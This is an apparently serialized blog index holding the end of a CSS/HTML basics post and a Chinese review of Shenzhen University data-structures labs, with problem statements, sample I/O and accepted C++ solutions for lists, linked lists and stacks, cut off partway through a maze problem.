a:link\t定义正常链接的样式；\n\n* a:visited     定义已访问过链接的样式；\n\n* a:hover    定义鼠标悬浮在链接上时的样式；\n\n* a:active    定义鼠标点击链接时的样式；\n\n四种伪类的优先级：link > visited > hover > active\n\n```css\na:link {\n\tcolor:red;\n    text-decoration:underline;\n} //正常链接为红色\na:visited {\n    color:blue;\n    text-decoration:none;\n} //已访问链接为蓝色\na:hover {\n\tcolor:black;\n\ttext-decoration:none;\n} //鼠标悬浮在链接上的时候是黑色\na:active {\n\tcolor:white;\n    text-decoration:none;\n} //点击链接时是白色\n```\n\n##### 超链接去掉下划线\n\n```css\na { text-decoration:none }\n```\n\n\n\n### 图片标签\n\n* 基本格式\n\n  ```html\n  <img src=\"图片url\" alt=\"picture\" height=\"100\" width=\"100\">\n  ```\n\n  src：图片源\n\n  alt：图片加载不出来时显示\n\n  height,width：图片的大小设置\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["前端","HTML","CSS"],"categories":["前端"]},{"title":"深圳大学数据结构期末复习与实验代码","url":"/2022/12/25/深圳大学数据结构期末复习与实验代码/","content":"\n# 深圳大学数据结构期末复习与实验代码\n\n<!-- toc -->\n\n## 顺序表\n\n#### 顺序表综合\n\n题目：\n\n```question\n题目描述\n给出顺序表的初始数据，实现顺序表的定义、创建、插入、删除与查找操作。\n\n输入\n测试次数t\n每组测试数据格式如下：\n第一行: 正整数n，后跟n个整数\n第二行: 插入位置 插入元素\n第三行: 删除位置\n第四行: 删除元素\n第五行: 查找元素\n\n输出\n对每个顺序表，首先输出建表后的顺序表。\n插入、删除操作，操作成功，输出操作后的顺序表。操作不成功，输出ERROR。\n查找操作，查找成功，输出:1 元素位置（位置从1开始）比较次数。查找不成功，输出:0 0 比较次数。\n```\n\n输入样例：\n\n```\n2\n5 10 20 14 25 50\n1 13\n10\n10\n23\n7 88 99 77 11 22 33 44\n7 100\n1\n80\n22\n```\n\n输出样例：\n\n```\n5 10 20 14 25 50 \n6 13 10 20 14 25 50 \nERROR\n5 13 20 14 25 50 \n0 0 6\n7 88 99 77 11 22 33 44 \n8 88 99 77 11 22 33 100 44 \n7 99 77 11 22 33 100 44 \nERROR\n1 4 4\n```\n\nAC代码\n\n```cpp\n#include<iostream>\nusing namespace std;\n\nint t, len;\nint num[1000];\n\nvoid print()\n{\n\tcout << len << ' ';\n\tfor (int i = 1; i <= len; i++)\n\t{\n\t\tcout << num[i] << ' ';\n\t}\n\tcout << endl;\n}\n\nvoid insert(int i, int x)\n{\n\tif (i > len + 1)\n\t{\n\t\tcout << \"ERROR\" << endl;\n\t\treturn;\n\t}\n\tlen++;\n\tfor (int j = len; j > i; j--)\n\t{\n\t\tnum[j] = num[j - 1];\n\t}\n\tnum[i] = x;\n\tprint();\n}\n\nvoid delbyid(int id, int type)//type为判断单独调用或函数内调用\n{\n\tif (id > len || id < 1)\n\t{\n\t\tcout << \"ERROR\" << endl;\n\t\treturn;\n\t}\n\tfor (int i = id; i < len; i++)\n\t{\n\t\tnum[i] = num[i + 1];\n\t}\n\tlen--;\n\tif(type)print();\n}\n\nvoid delbyvalue(int x)\n{\n\tint cnt = 0;\n\tfor (int i = 1; i <= len; i++)\n\t{\n\t\tif (num[i] == x)delbyid(i, 0), cnt++;\n\t}\n\tif (!cnt)cout << \"ERROR\" << endl;\n\telse print();\n}\n\nvoid search(int x)\n{\n\tint cnt = 0;\n\tnum[0] = x;\n\tfor (int i = len; i ; i--)\n\t{\n\t\tcnt++;\n\t\tif (num[i] == x && i)\n\t\t{\n\t\t\tcout << '1' << ' ' << i << ' ' << cnt << endl;\n\t\t\treturn;\n\t\t}\n\t}\n\tcnt++;\n\tcout << '0' << ' ' << '0' << ' ' << cnt  << endl;\n}\n\nint main()\n{\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tcin >> len;\n\t\tfor (int i = 1; i <= len; i++)cin >> num[i];\n\t\tprint();\n\t\tint id, x;\n\t\tcin >> id >> x;\n\t\tinsert(id, x);\n\t\tcin >> id >> x;\n\t\tdelbyid(id, 1);\n\t\tdelbyvalue(x);\n\t\tcin >> x;\n\t\tsearch(x);\n\t}\n\treturn 0;\n}\n```\n\n\n\n## 链表\n\n#### DS单链表--类实现\n\n题目：\n\n```\n用C++语言和类实现单链表，含头结点\n\n属性包括：data数据域、next指针域\n\n操作包括：插入、删除、查找\n\n注意：单链表不是数组，所以位置从1开始对应首结点，头结点不放数据\n\n输入\nn\n第1行先输入n表示有n个数据，接着输入n个数据\n第2行输入要插入的位置和新数据\n第3行输入要插入的位置和新数据\n第4行输入要删除的位置\n第5行输入要删除的位置\n第6行输入要查找的位置\n第7行输入要查找的位置\n\n输出\nn\n数据之间用空格隔开，\n第1行输出创建后的单链表的数据\n每成功执行一次操作（插入或删除），输出执行后的单链表数据\n每成功执行一次查找，输出查找到的数据\n如果执行操作失败（包括插入、删除、查找等失败），输出字符串error，不必输出单链表\n```\n\n样例：\n\n```\n6 11 22 33 44 55 66\n3 777\n1 888\n1\n11\n0\n5\n```\n\n样例输出：\n\n```11 22 33 44 55 66 \n11 22 777 33 44 55 66 \n888 11 22 777 33 44 55 66 \n11 22 777 33 44 55 66 \nerror\nerror\n44\n```\n\nAC代码：\n\n```cpp\n#define _CRT_SECURE_NO_WARNINGS\n#include<iostream>\nusing namespace std;\n\nclass node\n{\npublic:\n\tint data;\n\tnode* next;\n\tnode() { next = NULL; }\n\tnode(int i, node* p) :data(i), next(p) {};\n};\n\nclass list\n{\npublic:\n\tnode* head;\n\tint len;\n\tlist()\n\t{\n\t\thead = new node;\n\t\tlen = 0;\n\t}\n\t~list()\n\t{\n\t\tnode* p, * q;\n\t\tp = head;\n\t\twhile (p != NULL)\n\t\t{\n\t\t\tq = p;\n\t\t\tp = p->next;\n\t\t\tdelete q;\n\t\t}\n\t\tlen = 0;\n\t\thead = NULL;\n\t}\n\tnode* index(int i);\n\tint insert(int i, int item);\n\tint del(int i);\n\tvoid display()\n\t{\n\t\tnode* p;\n\t\tp = head->next;\n\t\twhile (p)\n\t\t{\n\t\t\tcout << p->data << ' ';\n\t\t\tp = p->next;\n\t\t}\n\t\tcout << endl;\n\t}\n};\n\nnode* list::index(int i)\n{\n\tnode* p;\n\tint k;\n\tif (i < 0)return NULL;\n\tfor (p = head, k = 0; p && k < i; k++)\n\t{\n\t\tp = p->next;\n\t}\n\treturn p;\n\n}\n\nint list::insert(int i, int item)\n{\n\tnode* p = index(i - 1);\n\tif (!p)return 0;\n\tnode* q = new node(item, p->next);\n\tp->next = q;\n\treturn 1;\n}\n\nint list::del(int i)\n{\n\tnode* p = index(i - 1);\n\tif (!p || !p->next)return 0;\n\tnode* q = p->next;\n\tp->next = q->next;\n\tdelete q;\n\treturn 1;\n}\n\nint main()\n{\n\tint n, x;\n\tlist li;\n\n\tcin >> n;\n\n\tfor (int i = 1; i <= n; i++)\n\t{\n\t\tcin >> x;\n\t\tli.insert(i,x);\n\t}\n\tli.display();\n\tint id;\n\tfor (int i = 0; i < 2; i++)\n\t{\n\t\tcin >> id >> x;\n\t\tif (li.insert(id, x))li.display();\n\t\telse cout << \"error\\n\";\n\t}\n\tfor (int i = 0; i < 2; i++)\n\t{\n\t\tcin >> id;\n\t\tif (li.del(id))li.display();\n\t\telse cout << \"error\\n\";\n\t}\n\tfor (int i = 0; i < 2; i++)\n\t{\n\t\tcin >> id;\n\t\tif (li.index(id) != li.head && li.index(id) != NULL)cout << li.index(id)->data << endl;\n\t\telse cout << \"error\\n\";\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### DS单链表—删除重复元素\n\n题目：\n\n```\n给定n个整数，按输入顺序建立单链表，删除其中的重复数字，输出结果链表。（要求不可以构建新结点，不可以定义新链表。在原链表上删除。）\n\n输入\n测试次数t\n每组测试数据一行：\nn（表示有n个整数），后跟n个数字\n\n输出\n对每组测试数据，输出删除重复数字后的结果链表表长和每个元素，具体格式见样例。\n```\n\n样例：\n\n```\n3\n10 1 2 3 4 1 2 10 20 30 20\n5 1 1 1 1 1\n6 20 22 22 22 22 20\n```\n\n样例输出：\n\n```\n7: 1 2 3 4 10 20 30\n1: 1\n2: 20 22\n```\n\nAC代码：\n\n```cpp\n#define _CRT_SECURE_NO_WARNINGS\n#include<iostream>\nusing namespace std;\n\nclass node\n{\npublic:\n\tint data;\n\tnode* next;\n\tnode() { next = NULL; }\n\tnode(int i, node* p) :data(i), next(p) {};\n};\n\nclass list\n{\npublic:\n\tnode* head;\n\tint len;\n\tlist()\n\t{\n\t\thead = new node;\n\t\tlen = 0;\n\t}\n\t~list()\n\t{\n\t\tnode* p, * q;\n\t\tp = head;\n\t\twhile (p != NULL)\n\t\t{\n\t\t\tq = p;\n\t\t\tp = p->next;\n\t\t\tdelete q;\n\t\t}\n\t\tlen = 0;\n\t\thead = NULL;\n\t}\n\tnode* index(int i);\n\tint insert(int i, int item);\n\tint del(int i);\n\tbool delsame();\n\tvoid display()\n\t{\n\t\tnode* p;\n\t\tp = head->next;\n\t\tcout << len << \":\";\n\t\twhile (p)\n\t\t{\n\t\t\tcout << ' ' << p->data;\n\t\t\tp = p->next;\n\t\t}\n\t\tcout << endl;\n\t}\n};\n\nnode* list::index(int i)\n{\n\tnode* p;\n\tint k;\n\tif (i < 0)return NULL;\n\tfor (p = head, k = 0; p && k < i; k++)\n\t{\n\t\tp = p->next;\n\t}\n\treturn p;\n\n}\n\nint list::insert(int i, int item)\n{\n\tnode* p = index(i - 1);\n\tif (!p)return 0;\n\tnode* q = new node(item, p->next);\n\tp->next = q;\n\tlen++;\n\treturn 1;\n}\n\nint list::del(int i)\n{\n\tnode* p = index(i - 1);\n\tif (!p || !p->next)return 0;\n\tnode* q = p->next;\n\tp->next = q->next;\n\tdelete q;\n\tlen--;\n\treturn 1;\n}\n\nbool list::delsame()\n{\n\tbool flag = 0;\n\tnode* p = head->next;\n\twhile (p)\n\t{\n\t\tnode* next = p->next;\n\t\tnode* now = p;\n\t\twhile (next)\n\t\t{\n\t\t\tif (p->data == next->data)\n\t\t\t{\n\t\t\t\tnow->next = next->next;\n\t\t\t\tnode* tmp = next;\n\t\t\t\tnext = next->next;\n\t\t\t\tdelete tmp;\n\t\t\t\tlen--;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tnow = now->next, next = next->next;\n\t\t\t}\n\t\t}\n\t\tp = p->next;\n\t}\n\tif (flag)return 1;\n\telse return 0;\n}\n\nint main()\n{\n\tint n, x, t;\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tcin >> n;\n\t\tlist li;\n\t\tfor (int i = 1; i <= n; i++)\n\t\t{\n\t\t\tcin >> x;\n\t\t\tli.insert(i, x);\n\t\t}\n\t\twhile(li.delsame());\n\t\tli.display();\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### DS单链表--结点交换\n\n题目：\n\n```\n用C++实现含头结点的单链表，然后实现单链表的两个结点交换位置。\n注意不能简单交换两个结点包含数据，必须通过修改指针来实现两个结点的位置交换\n交换函数定义可以参考：\nswap（int  pa, int pb)  //pa和pb表示两个结点在单链表的位置序号\nswap (ListNode * p, ListNode * q)  //p和q表示指向两个结点的指针\n\n输入\n第1行先输入n表示有n个数据，接着输入n个数据\n第2行输入要交换的两个结点位置\n第3行输入要交换的两个结点位置\n\n输出\n第一行输出单链表创建后的所有数据，数据之间用空格隔开\n第二行输出执行第1次交换操作后的单链表数据，数据之间用空格隔开\n第三行输出执行第2次交换操作后的单链表数据，数据之间用空格隔开\n如果发现输入位置不合法，输出字符串error，不必输出单链表\n```\n\n样例：\n\n```\n5 11 22 33 44 55\n1 4\n2 6\n\n```\n\n样例输出：\n\n```\n11 22 33 44 55 \n44 22 33 11 55 \nerror\n```\n\nAC代码：\n\n```cpp\n#define _CRT_SECURE_NO_WARNINGS\n#include<iostream>\nusing namespace std;\n\nclass node\n{\npublic:\n\tint data;\n\tnode* next;\n\tnode() { next = NULL; }\n\tnode(int i, node* p) :data(i), next(p) {};\n};\n\nclass list\n{\npublic:\n\tnode* head;\n\tint len;\n\tlist()\n\t{\n\t\thead = new node;\n\t\tlen = 0;\n\t}\n\t~list()\n\t{\n\t\tnode* p, * q;\n\t\tp = head;\n\t\twhile (p != NULL)\n\t\t{\n\t\t\tq = p;\n\t\t\tp = p->next;\n\t\t\tdelete q;\n\t\t}\n\t\tlen = 0;\n\t\thead = NULL;\n\t}\n\tnode* index(int i);\n\tint insert(int i, int item);\n\tint del(int i);\n\tint swp(int pa, int pb);\n\tvoid display()\n\t{\n\t\tnode* p;\n\t\tp = head->next;\n\t\twhile (p)\n\t\t{\n\t\t\tcout << p->data << ' ';\n\t\t\tp = p->next;\n\t\t}\n\t\tcout << endl;\n\t}\n};\n\nnode* list::index(int i)\n{\n\tnode* p;\n\tint k;\n\tif (i < 0)return NULL;\n\tfor (p = head, k = 0; p && k < i; k++)\n\t{\n\t\tp = p->next;\n\t}\n\treturn p;\n\n}\n\nint list::insert(int i, int item)\n{\n\tnode* p = index(i - 1);\n\tif (!p)return 0;\n\tnode* q = new node(item, p->next);\n\tp->next = q;\n\tlen++;\n\treturn 1;\n}\n\nint list::del(int i)\n{\n\tnode* p = index(i - 1);\n\tif (!p || !p->next)return 0;\n\tnode* q = p->next;\n\tp->next = q->next;\n\tdelete q;\n\treturn 1;\n}\n\nint list::swp(int pa, int pb)\n{\n\tif (pa > len || pb > len || pa <= 0 || pb <= 0)return 0;\n\tif (pa > pb)swap(pa, pb);\n\tint pre1, pre2, nxt1, nxt2;\n\tpre1 = pa - 1, pre2 = pb - 1, nxt1 = pa + 1, nxt2 = pb + 1;\n\tnode* p1, * p2, * n1, * n2, * ppa, * ppb;\n\tp1 = index(pre1), p2 = index(pre2), n1 = index(nxt1), n2 = index(nxt2);\n\tppa = index(pa), ppb = index(pb);\n\tif (pb == pa + 1)\n\t{\n\t\tp1->next = ppb;\n\t\tppb->next = ppa;\n\t\tppa->next = n2;\n\t}\n\telse\n\t{\n\t\tppa->next = n2, p2->next = ppa;\n\t\tppb->next = n1, p1->next = ppb;\n\t}\n\treturn 1;\n}\n\nint main()\n{\n\tint n, x;\n\tlist li;\n\tcin >> n;\n\tfor (int i = 1; i <= n; i++)\n\t{\n\t\tcin >> x;\n\t\tli.insert(i, x);\n\t}\n\tli.display();\n\tfor (int i = 0; i < 2; i++)\n\t{\n\t\tint a, b;\n\t\tcin >> a >> b;\n\t\tif (li.swp(a, b))li.display();\n\t\telse cout << \"error\\n\";\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### DS链表—学生宿舍管理（双向列表容器List）\n\n题目：\n\n```\n假设某校有20间宿舍，宿舍编号101，102，...,120。每间只住一名学生。初始部分宿舍已用。用两个链表（已用宿舍链表和可用宿舍链表）维护宿舍的管理，实现宿舍分配、宿舍交回。\n\n约定已用宿舍链表按宿舍号升序链接。初始可用宿舍链表也按宿舍号升序链接。\n\n宿舍分配从可用宿舍链表中摘取第一间宿舍分配给学生。学生交回的宿舍挂在可用宿舍链表最后。\n\n备注：使用list容器或静态链表。不用考虑宿舍分配和交回不成功的情况。\n\n初始宿舍状态，第一行输入n，表示已用宿舍n间\n后跟n行数据，每行格式为：学生姓名 宿舍号 \n操作次数m，后跟m行操作，操作格式如下：\nassign 学生  //为学生分配宿舍，从可用宿舍链表头摘取一间宿舍，\n//按宿舍号升序挂在已用宿舍链表中。\nreturn  宿舍号   //学生退宿舍，删除已用宿舍链表中对应结点，\n//挂在可用宿舍链表尾部。\ndisplay_free   //输出可用宿舍链表信息。\ndisplay_used   //输出已用宿舍链表信息。\n\ndisplay_free依次输出当前可用宿舍链表中的宿舍号，具体格式见样例。\ndisplay_used依次输出当前已用宿舍链表中的宿舍号，具体格式见样例。\n```\n\n输入:\n\n```\n5\n李明  103\n张三  106\n王五  107\n钱伟  112\n章立  118\n8\nassign 李四\nassign 赵六\nreturn 118\nreturn 101\nassign 马山\ndisplay_used\nassign 林立\ndisplay_free\n```\n\n输出：\n\n```\n赵六(102)-李明(103)-马山(104)-张三(106)-王五(107)-钱伟(112)\n108-109-110-111-113-114-115-116-117-119-120-118-101\n```\n\nAC代码：\n\n```cpp\n#define _CRT_SECURE_NO_WARNINGS\n#include<iostream>\n#include<list>\nusing namespace std;\n\nint cnt = 0;\n\nstruct node\n{\n\tstring name;\n\tint id;\n};\n\nint main()\n{\n\tlist<node>li;\n\tnode a;\n\tfor (int i = 1; i <= 20; i++)\n\t{\n\t\ta.name = \"0\", a.id = 100 + i;\n\t\tli.push_back(a);\n\t}\n\n\tint n, m, id;\n\tstring name, op;\n\tcin >> n;\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tcin >> name >> id;\n\t\tlist<node>::iterator it = li.begin();\n\t\tfor (int i = 0; i < 20; i++)\n\t\t{\n\t\t\tif (it->id == id)\n\t\t\t{\n\t\t\t\tit->name = name;\n\t\t\t\tcnt++;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tit++;\n\t\t}\n\t}\n\tcin >> m;\n\twhile (m--)\n\t{\n\t\tcin >> op;\n\t\tif (op == \"assign\")\n\t\t{\n\t\t\tcin >> name;\n\t\t\tlist<node>::iterator it = li.begin();\n\t\t\tfor (int i = 0; i < 20; i++)\n\t\t\t{\n\t\t\t\tif (it->name==\"0\")\n\t\t\t\t{\n\t\t\t\t\tit->name = name;\n\t\t\t\t\tcnt++;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tit++;\n\t\t\t}\n\t\t}\n\t\telse if (op == \"return\")\n\t\t{\n\t\t\tnode a;\n\t\t\tcin >> id;\n\t\t\tlist<node>::iterator it = li.begin();\n\t\t\tfor (int i = 0; i < 20; i++)\n\t\t\t{\n\t\t\t\tif (id == it->id)\n\t\t\t\t{\n\t\t\t\t\ta.name = \"0\", a.id = it->id;\n\t\t\t\t\tli.push_back(a);\n\t\t\t\t\tli.erase(it);\n\t\t\t\t\tcnt--;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tit++;\n\t\t\t}\n\t\t}\n\t\telse if (op == \"display_free\")\n\t\t{\n\t\t\tlist<node>::iterator it = li.begin();\n\t\t\tint cntf = 0;\n\t\t\tfor (int i = 0; i < 20; i++)\n\t\t\t{\n\t\t\t\tif (it->name == \"0\")\n\t\t\t\t{\n\t\t\t\t\tcout << it->id;\n\t\t\t\t\tif (cntf == 19 - cnt)cout << endl;\n\t\t\t\t\telse cout << '-';\n\t\t\t\t\tcntf++;\n\t\t\t\t}\n\t\t\t\tit++;\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\tint cntt = 0;\n\t\t\tlist<node>::iterator it = li.begin();\n\t\t\tfor (int i = 0; i < 20; i++)\n\t\t\t{\n\t\t\t\tif (it->name != \"0\")\n\t\t\t\t{\n\t\t\t\t\tcout << it->name << '(' << it->id << ')';\n\t\t\t\t\tif (cntt == cnt - 1)cout << endl;\n\t\t\t\t\telse cout << '-';\n\t\t\t\t\tcntt ++ ;\n\t\t\t\t}\n\t\t\t\tit++;\n\t\t\t}\n\t\t}\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### 顺序表和链表的时间复杂度比较\n\n|        | **序号访问** | **查找** | **插入** | **删除** |\n| ------ | ------------ | -------- | -------- | -------- |\n| 顺序表 | O(1)         | O(N)     | O(N)     | O(N)     |\n| 链表   | O(N)         | O(N)     | O(1)     | O(1)     |\n\n#### 静态链表\n\n* 线性链表也可以采用静态数组实现\n\n* 与顺序表有两点不同：\n\n​\t\t1、每个元素包括数据域和指针域\n\n​\t\t2、元素的逻辑关系由指针（下标，游标）确定\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230131172409914.png\" alt=\"image-20230131172409914\" style=\"zoom:50%;\" />\n\n* 与单链表区别：\n\n​\t\t1、静态链表暂时不用结点，链成一个备用链表。\n\n​\t\t2、插入时，从备用链表中申请结点。\n\n​\t\t3、删除结点时，将结点放入备用链表。\n\n初始化：\n\n```cpp\n//备用链表初始化，list[0]为头结点\nfor (i=0;i<MAXSIZE-1;i++)\n      list[i].next =i+1;\n list[MAXSIZE-1].next=0\n list[0].next = 2;\n\n //静态链表初始化，list[1]为头结点\n list[1].next = 0;\n//0表示链表结束。\n```\n\n头插法：\n\n```cpp\nk =  list[0].next;    \n//k=2,获得一个空闲结点，\nlist[0].next=list[k].next;\n// 修改备用链头结点的游标，\n//从备用链表删除第一个空闲结点\n\nlist[k].data = ‘z’;   //结点数据写入\nlist[k].next=list[1].next;\nlist[1].next=k;\n// 在静态链表中头插插入当前k结点\n```\n\n删除：\n\n```cpp\n// 删除静态链表中的第i个结点,假设它在数组中的下标为p,前一个结点的下标为q。\nList[q].next=list[p].next;\n//修改q的next指向p的next。\n//从静态链表删除p\nList[p].next=list[0].next;\nList[0].next=p;\n//将p结点头插插入备用链表\n```\n\n\n\n\n\n## 栈\n\n#### DS堆栈--逆序输出（STL栈使用）\n\n题目:\n\n```\nC++中已经自带堆栈对象stack，无需编写堆栈操作的具体实现代码。\n本题目主要帮助大家熟悉stack对象的使用，然后实现字符串的逆序输出\n输入一个字符串，按字符按输入顺序压入堆栈，然后根据堆栈后进先出的特点，做逆序输出\n\nstack类使用的参考代码\nn包含头文件<stack>：#include <stack>\nn创建一个堆栈对象s（注意stack是模板类）：stack <char>  s;//堆栈的数据类型是字符型\nn把一个字符ct压入堆栈：s.push(ct);\nn把栈顶元素弹出：s.pop();\nn获取栈顶元素，放入变量c2：c2 =s.top();\nn判断堆栈是否空：s.empty()，如果为空则函数返回true，如果不空则返回false\n\n输入\n第一行输入t，表示有t个测试实例\n第二起，每一行输入一个字符串，注意字符串不要包含空格\n字符串的输入可以考虑一下代码：\n#include <string>\nint main()\n{ string str;\nInt len;\ncin>>str; //把输入的字符串保存在变量str中\nlen = str.length()  //获取输入字符串的长度\n}\n\n输出\n每行逆序输出每一个字符串\n```\n\n样例：\n\n```\n2\nabcdef\naabbcc\n```\n\n样例输出：\n\n```\nfedcba\nccbbaa\n```\n\nAC代码：\n\n```cpp\n#define _CRT_SECURE_NO_WARNINGS\n#include<iostream>\n#include<stack>\nusing namespace std;\n\nint main()\n{\n\tstack<char>s;\n\tint n;\n\tcin >> n;\n\twhile (n--)\n\t{\n\t\tstring str;\n\t\tcin >> str;\n\t\tfor (int i = 0; i < str.size(); i++)\n\t\t{\n\t\t\ts.push(str[i]);\n\t\t}\n\t\twhile (!s.empty())\n\t\t{\n\t\t\tchar x;\n\t\t\tx = s.top();\n\t\t\tcout << x;\n\t\t\ts.pop();\n\t\t}\n\t\tcout << endl;\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### DS堆栈--行编辑\n\n题目:\n\n```\n使用C++的STL堆栈对象，编写程序实现行编辑功能。行编辑功能是：当输入#字符，则执行退格操作；如果无字符可退就不操作，不会报错\n\n本程序默认不会显示#字符，所以连续输入多个#表示连续执行多次退格操作\n每输入一行字符打回车则表示字符串结束\n \n注意：必须使用堆栈实现，而且结果必须是正序输出\n\n输入\n第一行输入一个整数t，表示有t行字符串要输入\n第二行起输入一行字符串，共输入t行\n\n输出\n每行输出最终处理后的结果，如果一行输入的字符串经过处理后没有字符输出，则直接输出NULL\n```\n\n样例：\n\n```\n4\nchinaa#\nsb#zb#u\n##shen###zhen###\nchi##a#####\n```\n\n样例输出：\n\n```\nchina\nszu\nsz\nNULL\n```\n\nAC代码：\n\n```cpp\n#define _CRT_SECURE_NO_WARNINGS\n#include<iostream>\n#include<stack>\nusing namespace std;\n\nint main()\n{\n\tstack<char>s1, s2;\n\tint n;\n\tcin >> n;\n\twhile (n--)\n\t{\n\t\tstring str;\n\t\tcin >> str;\n\t\tfor (int i = 0; i < str.size(); i++)\n\t\t{\n\t\t\tif (str[i] != '#')\n\t\t\t{\n\t\t\t\ts1.push(str[i]);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tif (!s1.empty())\n\t\t\t\t{\n\t\t\t\t\ts1.pop();\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tif (s1.empty())cout << \"NULL\" << endl;\n\t\telse\n\t\t{\n\t\t\twhile (!s1.empty())\n\t\t\t{\n\t\t\t\tchar x = s1.top();\n\t\t\t\ts2.push(x);\n\t\t\t\ts1.pop();\n\t\t\t}\n\t\t\twhile (!s2.empty())\n\t\t\t{\n\t\t\t\tchar x = s2.top();\n\t\t\t\tcout << x;\n\t\t\t\ts2.pop();\n\t\t\t}\n\t\t\tcout << endl;\n\t\t}\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### DS堆栈--括号匹配\n\n题目:\n\n```\n处理表达式过程中需要对括号匹配进行检验，括号匹配包括三种：“(”和“)”，“[”和“]”，“{”和“}”。例如表达式中包含括号如下：\n\n(\t)\t[\t(\t)\t(\t[\t]\t)\t]\t{\t}\n1\t2\t3\t4\t5\t6\t7\t8\t9\t10\t11\t12\n从上例可以看出第1和第2个括号匹配，第3和第10个括号匹配，4和5匹配，6和9匹配，7和8匹配，11和12匹配。从中可以看到括号嵌套的的情况是比较复杂的，使用堆栈可以很方便的处理这种括号匹配检验，可以遵循以下规则：\n1、 当接收第1个左括号，表示新的一组匹配检查开始；随后如果连续接收到左括号，则不断进堆栈。\n2、 当接受第1个右括号，则和最新进栈的左括号进行匹配，表示嵌套中1组括号已经匹配消除\n3、 若到最后，括号不能完全匹配，则说明输入的表达式有错\n建议使用C++自带的stack对象来实现\n\n输入\n第一行输入一个t，表示下面将有t组测试数据。接下来的t行的每行输入一个表达式，表达式只考虑英文半角状态输入，无需考虑中文全角输入\n\n输出\n对于每一行的表达式，检查括号是否匹配，匹配则输入ok，不匹配则输出error\n```\n\n样例1：\n\n```\n2\n(a+b)[4*5+(-6)]\n[5*8]/{(a+b)-6\n```\n\n样例1输出：\n\n```\nok\nerror\n```\n\n样例2：\n\n```\n4\n{1+1}[3+3](5+5)\n((({{{}}})))\n((({{{}}})))([[]])\n((({{{5+5}}})))([[]])(1+1)\n```\n\n样例2输出：\n\n```\nok\nok\nok\nok\n```\n\nAC代码：\n\n```cpp\n#define _CRT_SECURE_NO_WARNINGS\n#include<iostream>\n#include<stack>\nusing namespace std;\n\nint main()\n{\n\tint n;\n\tstack<char>op;\n\tcin >> n;\n\twhile (n--)\n\t{\n\t\tstring s;\n\t\tcin >> s;\n\t\tfor (int i = 0; i < s.size(); i++)\n\t\t{\n\t\t\tif (s[i] == '(' || s[i] == '[' || s[i] == '{')op.push(s[i]);\n\t\t\telse if (s[i] == ')')\n\t\t\t{\n\t\t\t\tif (op.top() != '(')\n\t\t\t\t{\n\t\t\t\t\tcout << \"error\\n\";\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\telse op.pop();\n\t\t\t}\n\t\t\telse if (s[i] == ']')\n\t\t\t{\n\t\t\t\tif (op.top() != '[')\n\t\t\t\t{\n\t\t\t\t\tcout << \"error\\n\";\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\telse op.pop();\n\t\t\t}\n\t\t\telse if (s[i] == '}')\n\t\t\t{\n\t\t\t\tif (op.top() != '{')\n\t\t\t\t{\n\t\t\t\t\tcout << \"error\\n\";\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\telse op.pop();\n\t\t\t}\n\t\t}\n\t\tif (op.empty())cout << \"ok\\n\";\n\t\telse cout << \"error\\n\";\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### DS堆栈--迷宫求解\n\n相当于用栈来模拟dfs的过程\n\n题目:\n\n```\n给出一个N*N的迷宫矩阵示意图，从起点[0,0]出发，寻找路径到达终点[N-1, N-1]\n要求使用堆栈对象来实现，具体算法参考课本3.2.4节51页\n\n输入\n第一行输入t，表示有t个迷宫\n第二行输入n，表示第一个迷宫有n行n列\n第三行起，输入迷宫每一行的每个方格的状态，0表示可通过，1表示不可通过\n输入n行\n以此类推输入下一个迷宫\n\n输出\n逐个输出迷宫的路径\n如果迷宫不存在路径，则输出no path并回车\n如果迷宫存在路径，将路径中每个方格的x和y坐标输出，从起点到终点，每输出四个方格就换行，最终以单词END结尾，具体格式参考示范数据\n输出的代码参考如下：\n```\n\n```cpp\n//path是保存路径的堆栈，堆栈中每个元素都包含x坐标和y坐标，用属性xp和yp表示\n//path1是一个临时堆栈，把path的数据倒序输出到path1，使得路径按正序输出\nif (!path.empty())//找到路径\n{//......若干代码，实现path的数据导入path1\ni=0;  //以下是输出路径的代码\nwhile (!path1.empty())\n{cpos = path1.top();\nif ( (++i)%4 == 0 )\ncout<<'['<<cpos.xp<<','<<cpos.yp<<']'<<\"--\"<<endl;\nelse\ncout<<'['<<cpos.xp<<','<<cpos.yp<<']'<<\"--\";\npath1.pop();\n}\ncout<<\"END\"<<endl;\n}\nelse\ncout<<\"no path\"<<endl; //找不到路径输出no path\n```\n\n\n\n样例1：\n\n```\n2\n8\n0 0 0 1 1 1 1 1\n1 0 0 0 1 0 0 1\n1 0 0 0 1 0 0 0\n1 1 0 0 0 0 0 1\n0 0 1 1 0 1 1 0\n0 0 0 0 0 0 1 1\n1 1 1 1 1 0 0 1\n0 0 0 0 1 0 0 0\n7\n0 0 0 1 1 1 1\n1 0 0 1 0 0 1\n1 0 0 1 0 0 0\n1 1 0 0 0 0 1\n0 0 1 1 0 1 0\n1 0 0 0 0 1 0\n0 0 0 0 1 1 0\n```\n\n样例1输出：\n\n```\n[0,0]--[0,1]--[0,2]--[1,2]--\n[1,3]--[2,3]--[3,3]--[3,4]--\n[4,4]--[5,4]--[5,5]--[6,5]--\n[6,6]--[7,6]--[7,7]--END\nno path\n```\n\n样例2：\n\n```\n2\n12\n0 1 1 1 1 1 1 1 1 1 1 0\n0 0 0 0 0 0 0 0 0 0 0 1\n0 1 